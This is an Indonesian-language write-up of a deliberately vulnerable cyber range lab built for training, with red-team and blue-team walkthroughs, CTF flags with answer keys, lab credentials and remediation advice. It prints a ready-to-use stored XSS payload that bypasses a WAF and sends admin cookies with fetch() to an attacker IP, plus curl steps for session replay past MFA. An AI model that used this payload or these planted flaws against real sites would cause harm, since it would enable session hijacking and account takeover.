# Practical Assessment — Cyber Range Engineering (Red vs. Blue Lab)
### Scenario: "Cookies Reuse & MFA Bypass" — Admin Feedback System

**Role:** Cybersecurity Engineer (Lab & Range Developer)
**Kandidat:** _[Isi nama Anda]_
**Tanggal:** 12 Juni 2026
**Repository:** https://github.com/Enjoy90/cyber-range-redblue-lab

> Dokumen ini adalah penjelasan tertulis (written explanation) atas lab Cyber Range
> "Red vs. Blue" yang dibangun sesuai brief. Seluruh kode sumber, file Docker, dan
> script provisioning disertakan pada **Lampiran A**. Pemetaan setiap requirement ke
> bukti implementasinya ada pada **Bagian 9 (Checklist Pemenuhan)**.

---

## 1. Ringkasan Eksekutif

Lab ini mensimulasikan kerentanan **session token issuance** pada sebuah "Admin
Feedback System" korporat. Meskipun MFA diterapkan, logika sesi cacat sehingga:

1. **Red Team** dapat menanam **Stored XSS** (menembus WAF sederhana), mencuri cookie
   sesi admin yang tidak `HttpOnly`, lalu **me-replay** cookie tersebut untuk masuk ke
   `/dashboard` **tanpa melewati MFA** (session replay → MFA bypass).
2. **Blue Team** memperoleh **telemetry log forensik** (`access.log` + `error.log` di
   `/opt/admin/logs`) yang menceritakan kronologi serangan secara presisi, untuk
   incident response & threat hunting.

Seluruh lingkungan **terkontainerisasi (Docker Compose)**, berjalan pada **satu VM
Linux** yang siap di-deploy ke **Proxmox**, dengan web app di **port 3075** dan akses
SSH Blue Team di **port 2275**.

---

## 2. Arsitektur

```
                 ┌──────────────────────  VM Linux (Ubuntu, di Proxmox)  ──────────────────────┐
                 │                                                                              │
  Red Team  ───────────► :3075 (HTTP)                       Blue Team ───────► :2275 (SSH)      │
  (10.10.14.50)  │            │                              (analyst / blue_team_rocks)         │
                 │            ▼                                        │                          │
                 │   ┌─────────────────┐   proxy    ┌──────────────┐  │  baca log                │
                 │   │  nginx (3075)   │──────────► │  app (Node)  │  │  /opt/admin/logs          │
                 │   │  tulis access/  │            │  3075        │  ▼                            │
                 │   │  error.log      │            │  WAF + XSS + │  access.log                   │
                 │   └─────────────────┘            │  session     │  error.log                    │
                 │            ▲                      │  flaw        │                              │
                 │            │ memicu XSS           └──────────────┘                              │
                 │   ┌─────────────────┐                                                          │
                 │   │ admin-bot       │  login (password+MFA) → buka /dashboard berkala          │
                 │   │ (Playwright)    │  = KORBAN yang cookie adm_sess-nya dicuri XSS            │
                 │   └─────────────────┘                                                          │
                 │                                                                                │
                 │   Volume: /opt/admin/logs  ◄── inject_logs.py menyuntik timeline serangan     │
                 └────────────────────────────────────────────────────────────────────────────────┘
```

**Tiga komponen container:**

| Service | Fungsi | Catatan |
|---|---|---|
| `nginx` | Reverse proxy di port 3075; menulis `access.log` & `error.log` format nginx | Pintu masuk Red Team |
| `app` | Node.js "Admin Feedback System" yang sengaja rentan | Semua flag Red tertanam di sini |
| `admin-bot` | Browser headless (Playwright) yang berperan sbg admin korban | Memicu eksekusi Stored XSS |

**Mengapa ada `admin-bot`?** Serangan XSS memerlukan korban yang memiliki cookie admin
valid. Bot login penuh (password + MFA) untuk mendapat cookie `adm_sess`, lalu membuka
`/dashboard` secara berkala — di titik itulah payload XSS Red Team tereksekusi di konteks
admin dan cookie-nya terkirim (exfil) ke listener penyerang.

---

## 3. Infrastruktur & Deployment (Requirement #1)

| Requirement | Implementasi |
|---|---|
| OS Linux + Docker/Compose | Ubuntu VM + `docker-compose.yml` (3 service) |
| Otomatis & deployable di 1 VM Proxmox | `scripts/bootstrap.sh` + `cloud-init/user-data` |
| Network zone `feedback.admin.local` | alias network pada compose + `server_name` nginx |
| Web app HTTP **port 3075** | nginx `listen 3075` → proxy ke app `3075` |
| SSH **port 2275** (analyst / blue_team_rocks) | dibuat oleh `bootstrap.sh` (user + `Port 2275`) |

### Kredensial & Akses Lab

| Peran | Akses | Kredensial |
|---|---|---|
| Admin (web) | `http://<IP>:3075/login` | `admin` / `Superadmin123`, OTP `135790` |
| Blue Team (SSH) | `ssh analyst@<IP> -p 2275` | `analyst` / `blue_team_rocks` |

> Catatan: kode OTP **tidak ditampilkan** pada antarmuka (mensimulasikan TOTP authenticator
> nyata); nilai untuk lab adalah `135790`.

### Fitur Antarmuka & Catatan Implementasi

Aplikasi dikembangkan menyerupai produk nyata agar skenario lebih realistis:

| Fitur | Keterangan |
|---|---|
| Antarmuka publik | Halaman *Review* modern (navbar About/Review). Panel admin tidak ditautkan di menu publik (hanya ditemukan via recon `robots.txt`). |
| Model cookie `sess` | Setiap pengunjung memperoleh cookie `sess`; tamu = `guest_...`, admin (pasca-MFA) = `adm_sess_...`. Hanya nilai berprefix `adm_sess` yang membuka `/dashboard`. |
| Manajemen review | Admin dapat **menghapus** review dari dashboard. |
| Penyimpanan | Review dipersistensikan ke berkas JSON (`app/data/reviews.json`). |
| Logout aman | Logout meng-**invalidasi sesi di sisi server** + header `no-store` sehingga tombol *Back* tidak dapat menampilkan dashboard (kontras dengan kelemahan replay sesi aktif). |

---

## 4. Red Team Attack Path (Requirement #2)

### FASE 1 — Reconnaissance
- **Header `X-Powered-By: Node.js`** sengaja di-set (`server.js`) → membocorkan backend.
- **`/robots.txt`** men-`Disallow` `/api/verify-mfa` dan `/dashboard`.
- **Komentar ASCII art** di source `/` memberi petunjuk membaca `robots.txt`.
- **Cookie pra-autentikasi** `pre_mfa_session = pending_mfa_verification`, `HttpOnly=false`.

### FASE 2 — Defense Evasion (WAF & XSS)
- Endpoint feedback **POST-only** (`/feedback`).
- **WAF** memblok `<script>` → **HTTP 403**.
- **Bypass**: elemen HTML5 `<svg onload=...>` lolos (WAF hanya memblok `<script>`).
- **Obfuscation**: WAF memblok kata `document`/`cookie`, sehingga akses cookie harus
  disamarkan: `window['docu'+'ment']['coo'+'kie']`.
- Cookie **`HttpOnly=False`** → terbaca JavaScript. **Tidak ada CSP** → `fetch()` bebas
  untuk exfiltrasi.

**Payload bypass lengkap (siap pakai):**
```html
<svg onload="fetch('http://10.10.14.50:9000/c?d='+window['docu'+'ment']['coo'+'kie'])">
```
> Tidak mengandung `<script`, kata utuh `document`, maupun `cookie` → **lolos WAF**.

### FASE 3 — Initial Access (MFA Bypass & Session Replay)
- Setiap pengunjung menerima cookie bernama `sess`. Tamu memperoleh nilai
  non-privilege (`guest_...`); sesi admin yang lolos MFA memperoleh nilai berprefix
  **`adm_sess`** (memenuhi `SCENARIO75{adm_sess}`).
- Otorisasi `/dashboard` **hanya** memeriksa apakah nilai cookie `sess` valid dan
  berprefix `adm_sess` — **tidak pernah** memanggil `/api/verify-mfa`. Maka penyerang
  cukup **mengganti nilai cookie `sess` miliknya** dengan nilai `adm_sess_...` curian
  (session replay) untuk masuk **tanpa login dan tanpa MFA**.
- `/dashboard` memantulkan feedback (XSS) di dalam `<div class="xss-payload">`.
- **Flag final Red** tertanam di dashboard: `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`.

### Tabel Flag Red Team

| # | Item | Flag | Lokasi bukti |
|---|---|---|---|
| 1 | Backend tech | `SCENARIO75{Node.js}` | header `X-Powered-By` |
| 2 | Robots disallow | `SCENARIO75{/api/verify-mfa}` | `/robots.txt` |
| 3 | Admin area | `SCENARIO75{/dashboard}` | route `/dashboard` |
| 4 | Source hint | `SCENARIO75{robots.txt}` | komentar ASCII art di `/` |
| 5 | Cookie name | `SCENARIO75{pre_mfa_session}` | `Set-Cookie` |
| 6 | Cookie value | `SCENARIO75{pending_mfa_verification}` | `Set-Cookie` |
| 7 | Method feedback | `SCENARIO75{POST}` | route `/feedback` |
| 8 | WAF block status | `SCENARIO75{403}` | respons saat `<script>` |
| 9 | WAF bypass | `SCENARIO75{<svg>}` | elemen `<svg onload>` |
| 10 | Obfuscation | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` | payload |
| 11 | HttpOnly | `SCENARIO75{False}` | atribut cookie |
| 12 | Exfil API | `SCENARIO75{fetch}` | payload |
| 13 | Endpoint di-skip | `SCENARIO75{/api/verify-mfa}` | logika `/dashboard` |
| 14 | Session prefix | `SCENARIO75{adm_sess}` | nilai cookie `sess` |
| 15 | CSS class XSS | `SCENARIO75{xss-payload}` | render `/dashboard` |
| 16 | **Flag final** | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` | `/dashboard` |

---

## 5. Blue Team — Telemetry & Log Forensics (Requirement #3)

Log disimpan di **`/opt/admin/logs`** (`access.log` format nginx + `error.log`). Script
**`scripts/inject_logs.py`** menyuntik kronologi serangan yang presisi saat deployment.

### Timeline serangan yang tercatat

| Waktu | Event | File | Indikator |
|---|---|---|---|
| 18:30–18:42 | Traffic admin sah dari `192.168.1.100` | access.log | baseline normal |
| 18:49:01–20 | Recon attacker `10.10.14.50` (UA `Mozilla/5.0`) | access.log | GET `/`, `/robots.txt`, `/dashboard` (302) |
| **18:50:15** | WAF block `<script>` pertama | error.log | `403`, level error |
| 18:50:40 | Bypass `<svg>` tersimpan | access.log | POST `/feedback` `200` |
| **18:51:55** | `/dashboard` diakses, status **200** | access.log | `X-Forwarded-For` = string Base64 (exfil) |
| **18:53:10** | **Authentication bypass anomaly** | error.log | level **CRITICAL**, cookie reuse |

Catatan kunci: **attacker tidak pernah menyentuh `/api/verify-mfa`** (tidak ada entri
`/api/verify-mfa` dari `10.10.14.50`) → membuktikan MFA dilewati via session replay.

### Tabel Flag Blue Team

| # | Item | Flag |
|---|---|---|
| 1 | Lokasi log | `SCENARIO75{/opt/admin/logs}` |
| 2 | IP attacker | `SCENARIO75{10.10.14.50}` |
| 3 | User-Agent | `SCENARIO75{Mozilla/5.0}` |
| 4 | Status dashboard | `SCENARIO75{200}` |
| 5 | Timestamp dashboard | `SCENARIO75{18:51:55}` |
| 6 | Base64 di XFF | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}` |
| 7 | Baseline admin | `SCENARIO75{192.168.1.100}` |
| 8 | Subnet attacker | `SCENARIO75{10.10.14.0/24}` |
| 9 | Error log path | `SCENARIO75{/opt/admin/logs/error.log}` |
| 10 | Tag WAF block | `SCENARIO75{<script>}` |
| 11 | Timestamp WAF block | `SCENARIO75{18:50:15}` |
| 12 | Attacker capai MFA? | `SCENARIO75{No}` |
| 13 | Jenis encoding | `SCENARIO75{Base64}` |
| 14 | Panjang string | `SCENARIO75{44}` _(lihat Reviewer Note)_ |
| 15 | Level cookie reuse | `SCENARIO75{CRITICAL}` |
| 16 | Timestamp anomaly | `SCENARIO75{18:53:10}` |
| 17 | String warning | `SCENARIO75{Authentication bypass anomaly}` |
| 18 | **Flag final (decode)** | brief: `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` _(lihat Reviewer Note)_ |

> **Reviewer Note (ketelitian):** String Base64 `UEhB...c3Qzcn0` bila di-decode
> menghasilkan **`PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}`** dan panjang stringnya **47**
> karakter (bukan 44). Terdapat sedikit ketidaksesuaian pada answer key brief (prefix
> `PHANTOMGRID` vs `SCENARIO75`, panjang 47 vs 44). Implementasi ini menanam **string
> Base64 PERSIS seperti yang diminta brief**, sehingga artefak forensiknya tetap akurat;
> perbedaan hanya pada teks jawaban referensi.

---

## 6. Walkthrough Red Team (bukti lab berfungsi)

```bash
# 1) Recon — bocoran teknologi & path tersembunyi
curl -i http://feedback.admin.local:3075/           # lihat header X-Powered-By: Node.js
curl http://feedback.admin.local:3075/robots.txt    # Disallow /api/verify-mfa, /dashboard

# 2) Uji WAF — payload <script> diblok (403)
curl -i -X POST http://feedback.admin.local:3075/feedback \
     -d "name=a&message=<script>alert(1)</script>"   # -> HTTP/1.1 403 Forbidden

# 3) Bypass WAF — payload <svg> + exfil via fetch + obfuscation cookie (tersimpan, 200)
curl -i -X POST http://feedback.admin.local:3075/feedback \
     --data-urlencode "name=a" \
     --data-urlencode "message=<svg onload=\"fetch('http://10.10.14.50:9000/c?d='+window['docu'+'ment']['coo'+'kie'])\">"

# 4) admin-bot membuka /dashboard -> XSS tereksekusi -> cookie adm_sess terkirim ke
#    listener Red Team (mis. `nc -lvnp 9000` atau `python3 -m http.server 9000`).

# 5) Session replay — pakai cookie adm_sess curian untuk masuk dashboard TANPA MFA:
curl -i http://feedback.admin.local:3075/dashboard \
     -H "Cookie: sess=adm_sess_<nilai_curian>"        # -> 200, muncul div.xss-payload
#    Flag final terlihat di dashboard: SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

---

## 7. Walkthrough Blue Team (analisis log forensik)

Login sebagai Blue Team lalu telusuri `/opt/admin/logs`:

```bash
ssh analyst@<IP-VM> -p 2275            # password: blue_team_rocks
cd /opt/admin/logs

# (Phase 1) IP & User-Agent penyerang
grep -E "POST|GET" access.log | awk '{print $1}' | sort | uniq -c
#   -> 10.10.14.50 mendominasi request mencurigakan; UA "Mozilla/5.0"

# Akses /dashboard sukses (200) pada 18:51:55 + header X-Forwarded-For (exfil)
grep "/dashboard" access.log | grep " 200 "
#   -> ...[12/Jun/2026:18:51:55 +0700] "GET /dashboard..." 200 ... "UEhB...c3Qzcn0"

# (Phase 2) WAF block <script> pertama @ 18:50:15
grep "<script>" error.log
#   -> 2026/06/12 18:50:15 [error] ... blocked <script> tag from client 10.10.14.50

# Apakah attacker pernah ke /api/verify-mfa? (jawaban: No)
grep "10.10.14.50" access.log | grep "/api/verify-mfa"   # -> kosong = No

# (Phase 3) Decode string Base64 dari header -> flag final Blue Team
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
#   -> PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}  (flag final Blue Team)

# Anomaly cookie reuse @ 18:53:10 (level CRITICAL)
grep "Authentication bypass anomaly" error.log
#   -> 2026/06/12 18:53:10 [CRITICAL] Authentication bypass anomaly: cookie reuse ...
```

**Narasi insiden (untuk presentasi):** lonjakan recon dari `10.10.14.50` → tembok 403 WAF
saat `<script>` → satu request `200` yang lolos (`<svg>`) → cookie admin ter-exfil (terlihat
di `X-Forwarded-For`) → sesi `adm_sess` di-replay dari IP penyerang pada 18:51:55 tanpa MFA
→ deteksi `CRITICAL` cookie reuse pada 18:53:10.

---

## 8. Deployment ke Proxmox

**Opsi A — Otomatis penuh (cloud-init):**
1. Buat VM Ubuntu 22.04 cloud image di Proxmox.
2. Lampirkan `cloud-init/user-data` (set `<REPO_URL>` ke repo Anda; isi `passwd` dengan
   hash `openssl passwd -6 'blue_team_rocks'`).
3. Boot VM → cloud-init membuat user `analyst`, set SSH 2275, clone repo, dan menjalankan
   `bootstrap.sh` (Docker + lab + inject log) otomatis.

**Opsi B — Manual (VM Ubuntu apa pun, termasuk VirtualBox untuk testing):**
```bash
sudo apt update && sudo apt install -y git
git clone <REPO_URL> /opt/cyber-range && cd /opt/cyber-range
sudo bash scripts/bootstrap.sh
```
Hasil: web app di `http://<IP-VM>:3075`, SSH Blue Team di `<IP-VM>:2275`.

> **Catatan testing:** Karena isi VM hanyalah Linux + Docker, `bootstrap.sh` menghasilkan
> lingkungan yang identik baik di Proxmox, VirtualBox, maupun cloud. Validasi fungsional
> dapat dilakukan pada VM Ubuntu biasa; cloud-init/`qm` hanya melapisi pembuatan VM di sisi
> host Proxmox.

---

## 9. Checklist Pemenuhan Requirement

| Requirement (brief) | Status | Bukti |
|---|:---:|---|
| Linux + Docker/Compose, 1 VM, otomatis | ✅ | `docker-compose.yml`, `bootstrap.sh`, `cloud-init` |
| Network zone `feedback.admin.local` | ✅ | alias network + `server_name` nginx |
| Web app HTTP port 3075 | ✅ | nginx `listen 3075` |
| SSH port 2275 (analyst/blue_team_rocks) | ✅ | `bootstrap.sh` |
| Node.js backend | ✅ | `app/server.js` |
| FASE 1 — semua 6 flag recon | ✅ | `server.js` (header, robots, ASCII, cookie) |
| FASE 2 — semua 6 flag WAF/XSS | ✅ | fungsi `waf()` + cookie + payload |
| FASE 3 — semua 4 flag access | ✅ | logika `/dashboard` + flag final |
| Blue — log di `/opt/admin/logs` | ✅ | nginx + `inject_logs.py` |
| Blue — script inject attack sequence | ✅ | `scripts/inject_logs.py` |
| Blue — semua flag forensik (IP, UA, timestamp, dll) | ✅ | tabel Bagian 5 |
| README deploy + walkthrough Red/Blue | ✅ | `README.md` + dokumen ini |

---

## 10. Analisis Keamanan & Remediasi (nilai tambah)

Bila ini sistem nyata, perbaikan yang direkomendasikan:

| Kerentanan | Perbaikan |
|---|---|
| Stored XSS | Output encoding / sanitasi (mis. DOMPurify), **Content-Security-Policy** ketat |
| WAF naif (string match) | Gunakan WAF berbasis ruleset (ModSecurity/CRS), bukan blacklist kata |
| Cookie tidak `HttpOnly` | Set `HttpOnly`, `Secure`, `SameSite=Strict` |
| Session replay lintas-IP | Ikat sesi ke device/IP/fingerprint; **regenerasi token setelah MFA**; idle/absolute timeout |
| MFA hanya di awal | Validasi status MFA pada setiap akses sumber daya sensitif (step-up auth) |

<!-- LAMPIRAN_KODE_OTOMATIS: bagian Lampiran A (source code) ditambahkan otomatis
     oleh md2docx.py dengan membaca berkas sumber asli, sehingga selalu sinkron. -->
